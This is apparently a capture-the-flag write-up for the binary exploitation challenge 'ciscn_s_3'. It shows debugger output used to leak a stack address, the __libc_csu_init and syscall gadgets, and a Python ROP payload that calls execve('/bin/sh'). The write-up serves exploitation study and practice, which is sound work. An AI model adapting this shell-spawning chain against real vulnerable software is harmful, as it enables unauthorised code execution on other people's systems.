# ciscn\_s\_3
 - 2 `syscall` in function `vuln`
  - `read(0,buf,0x400)`
  - `write(1,buf,0x30)`
 - `gadget`: `mov eax,0x3b; ret` in elf
  - `syscall` : `execve`
## leak stack addr

```
 ► 0x400517 <vuln+42>    syscall  <SYS_write>
        fd: 0x1
        buf: 0x7fffffffdaf0 ◂— 'AAAAAAAA\n'
        n: 0x30
   0x400519 <vuln+44>    ret    

# after write

pwndbg> x/6xg 0x7fffffffdaf0
0x7fffffffdaf0:	0x4141414141414141	0x000000000000000a
0x7fffffffdb00:	0x00007fffffffdb20	0x0000000000400536
0x7fffffffdb10:	0x00007fffffffdc08	0x0000000100000000

pwndbg> p 0x00007fffffffdc08 - 0x7fffffffdaf0
$1 = 280
```
 - buf = [buf+0x20] - 280

## execve('/bin/sh',0,0)
 - eax <- 0x3b
 - rdi <- '/bin/sh'
 - rsi <- 0
 - rdx <- 0
 - syscall

### clear rsi,rdi
```
.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    qword ptr [r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580

.text:0000000000400596                 add     rsp, 8
.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn

```

### set eax
```
   0x4004e2 <gadgets+12>:   mov    rax,0x3b
   0x4004e9 <gadgets+19>:   ret    

```

### set rdi
```
 prdi = 0x00000000004005a3 # pop rdi ; ret

```

### payload
```python 
# rop2
# execve(binsh, 0,  0  )
#  regs:  rdi  rsi rdx

payload2 = '/bin/sh\0' + p64(gadget)
payload2 += p64(p6r) + p64(0) + p64(1) + p64(binsh+0x8) + p64(0) + p64(0) + p64(binsh)
payload2 += p64(m3c) + p64(0xdeadbeef)*7
payload2 += p64(prdi) + p64(binsh)
payload2 += p64(syscall)

```
